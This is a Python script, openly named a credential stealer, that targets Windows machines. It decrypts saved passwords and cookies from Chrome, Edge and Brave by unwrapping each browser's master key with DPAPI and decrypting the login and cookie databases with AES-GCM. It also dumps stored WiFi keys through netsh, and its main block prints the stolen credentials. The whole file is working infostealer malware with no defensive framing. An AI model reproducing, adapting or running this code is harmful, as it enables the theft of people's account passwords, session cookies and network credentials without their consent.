#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import json
import sqlite3
import base64
import subprocess
import ctypes
from ctypes import wintypes
from datetime import datetime, timedelta  # ← IMPORT CORRECTO
from Crypto.Cipher import AES
import shutil


class Win32CryptAlternative:
    """Alternative to win32crypt using ctypes"""

    def __init__(self):
        self.crypt32 = ctypes.windll.crypt32
        self.kernel32 = ctypes.windll.kernel32

    def CryptUnprotectData(self, encrypted_data, entropy=None, flags=0):
        """Alternative to win32crypt.CryptUnprotectData"""

        class DATA_BLOB(ctypes.Structure):
            _fields_ = [('cbData', wintypes.DWORD),
                        ('pbData', ctypes.POINTER(ctypes.c_byte))]

        # Create input blob
        encrypted_bytes = bytes(encrypted_data)
        input_blob = DATA_BLOB()
        input_blob.cbData = len(encrypted_bytes)
        input_blob.pbData = ctypes.cast(ctypes.create_string_buffer(encrypted_bytes),
                                        ctypes.POINTER(ctypes.c_byte))

        # Optional entropy blob
        entropy_blob = DATA_BLOB()
        if entropy:
            entropy_bytes = bytes(entropy)
            entropy_blob.cbData = len(entropy_bytes)
            entropy_blob.pbData = ctypes.cast(ctypes.create_string_buffer(entropy_bytes),
                                              ctypes.POINTER(ctypes.c_byte))
            p_entropy = ctypes.byref(entropy_blob)
        else:
            p_entropy = None

        # Output blob
        output_blob = DATA_BLOB()

        # Call CryptUnprotectData
        success = self.crypt32.CryptUnprotectData(
            ctypes.byref(input_blob),
            None,
            p_entropy,
            None,
            None,
            flags,
            ctypes.byref(output_blob)
        )

        if not success:
            raise RuntimeError("CryptUnprotectData failed")

        try:
            # Extract decrypted data
            decrypted_data = ctypes.string_at(output_blob.pbData, output_blob.cbData)
            return decrypted_data
        finally:
            # Free memory
            self.kernel32.LocalFree(output_blob.pbData)


# Create global instance
win32crypt_alt = Win32CryptAlternative()



class CredentialStealer:
    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.browsers = {
            'chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data'
        }

    def get_chrome_datetime(self, chromedate):
        """Convert chrome format to datetime"""
        return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

    def decrypt_password(self, password, key):
        """Decrypt encrypted password"""
        try:
            # Try AES decryption first
            iv = password[3:15]
            encrypted_password = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(encrypted_password)[:-16].decode('utf-8')
            return decrypted
        except Exception as e:
            # Fallback to CryptUnprotectData
            try:
                decrypted = win32crypt_alt.CryptUnprotectData(password, None, None, None, 0)
                return decrypted.decode('utf-8')
            except:
                return f"Failed to decrypt: {str(e)}"

    def get_encryption_key(self, browser_path):
        """Get encryption key from browser's Local State"""
        try:
            key_path = os.path.join(browser_path, 'Local State')
            if not os.path.exists(key_path):
                return None

            with open(key_path, 'r', encoding='utf-8') as f:
                local_state = json.loads(f.read())

            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix

            # Use our alternative to CryptUnprotectData
            decrypted_key = win32crypt_alt.CryptUnprotectData(encrypted_key, None, None, None, 0)
            return decrypted_key

        except Exception as e:
            print(f"Error getting encryption key: {e}")
            return None

    def extract_credentials(self):
        """Extract all credentials from browsers"""
        results = {}

        for browser, path in self.browsers.items():
            if not os.path.exists(path):
                continue

            try:
                # Get encryption key
                key = self.get_encryption_key(path)
                if not key:
                    results[browser] = "No encryption key found"
                    continue

                # Copy database temporarily
                temp_db = os.path.join(os.getenv('TEMP'), f'{browser}_temp.db')
                login_data = os.path.join(path, 'Default', 'Login Data')

                if os.path.exists(login_data):
                    shutil.copy2(login_data, temp_db)

                    # Connect to database
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()

                    # Get passwords
                    cursor.execute("""
                        SELECT origin_url, username_value, password_value 
                        FROM logins 
                        WHERE username_value != '' 
                        AND password_value != ''
                    """)

                    passwords = []
                    for row in cursor.fetchall():
                        url = row[0]
                        username = row[1]
                        encrypted_password = row[2]

                        decrypted_password = self.decrypt_password(encrypted_password, key)

                        passwords.append({
                            'url': url,
                            'username': username,
                            'password': decrypted_password
                        })

                    results[browser] = passwords
                    conn.close()
                    os.remove(temp_db)

            except Exception as e:
                results[browser] = f"Error: {str(e)}"

        return results

    def steal_cookies(self):
        """Steal browser cookies"""
        cookies_data = {}

        for browser, path in self.browsers.items():
            if not os.path.exists(path):
                continue

            try:
                # Get encryption key
                key = self.get_encryption_key(path)
                if not key:
                    cookies_data[browser] = "No encryption key found"
                    continue

                cookies_path = os.path.join(path, 'Default', 'Cookies')
                temp_db = os.path.join(os.getenv('TEMP'), f'{browser}_cookies.db')

                if os.path.exists(cookies_path):
                    shutil.copy2(cookies_path, temp_db)

                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()

                    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")

                    cookies = []
                    for row in cursor.fetchall():
                        host = row[0]
                        name = row[1]
                        encrypted_value = row[2]

                        decrypted_value = self.decrypt_password(encrypted_value, key)

                        cookies.append({
                            'host': host,
                            'name': name,
                            'value': decrypted_value
                        })

                    cookies_data[browser] = cookies
                    conn.close()
                    os.remove(temp_db)

            except Exception as e:
                cookies_data[browser] = f"Error: {str(e)}"

        return cookies_data

    def get_wifi_passwords(self):
        """Get saved WiFi passwords"""
        try:
            profiles = []
            # Run command to get WiFi profiles
            result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'],
                                    capture_output=True, text=True, encoding='utf-8')

            if result.returncode != 0:
                return []

            lines = result.stdout.split('\n')

            for line in lines:
                if 'All User Profile' in line:
                    parts = line.split(':')
                    if len(parts) >= 2:
                        profile = parts[1].strip()
                        try:
                            # Get password for this profile
                            password_result = subprocess.run([
                                'netsh', 'wlan', 'show', 'profile', profile, 'key=clear'
                            ], capture_output=True, text=True, encoding='utf-8')

                            if password_result.returncode == 0:
                                password_lines = password_result.stdout.split('\n')
                                for pass_line in password_lines:
                                    if 'Key Content' in pass_line:
                                        password_parts = pass_line.split(':')
                                        if len(password_parts) >= 2:
                                            password = password_parts[1].strip()
                                            profiles.append({
                                                'ssid': profile,
                                                'password': password
                                            })
                                            break
                        except:
                            continue

            return profiles
        except Exception as e:
            print(f"Error getting WiFi passwords: {e}")
            return []

    def run(self):
        """Execute all credential stealing functions"""
        print("Starting credential extraction...")

        try:
            passwords = self.extract_credentials()
            print("Passwords extracted")
        except Exception as e:
            passwords = f"Error extracting passwords: {str(e)}"
            print(passwords)

        try:
            cookies = self.steal_cookies()
            print("Cookies extracted")
        except Exception as e:
            cookies = f"Error extracting cookies: {str(e)}"
            print(cookies)

        try:
            wifi = self.get_wifi_passwords()
            print("WiFi passwords extracted")
        except Exception as e:
            wifi = f"Error extracting WiFi passwords: {str(e)}"
            print(wifi)

        return {
            'passwords': passwords,
            'cookies': cookies,
            'wifi': wifi,
            'timestamp': datetime.now().isoformat()
        }


# Test function
if __name__ == "__main__":
    stealer = CredentialStealer()
    results = stealer.run()

    print("\n" + "=" * 50)
    print("CREDENTIAL STEALER RESULTS")
    print("=" * 50)

    print("WiFi Passwords:")
    for wifi in results['wifi']:
        print(f"  {wifi['ssid']}: {wifi['password']}")

    print("\nBrowser Passwords:")
    for browser, data in results['passwords'].items():
        if isinstance(data, list):
            print(f"  {browser}: {len(data)} passwords")
            for i, item in enumerate(data[:3]):  # Show first 3
                print(f"    {i + 1}. {item['url']} - {item['username']}")
        else:
            print(f"  {browser}: {data}")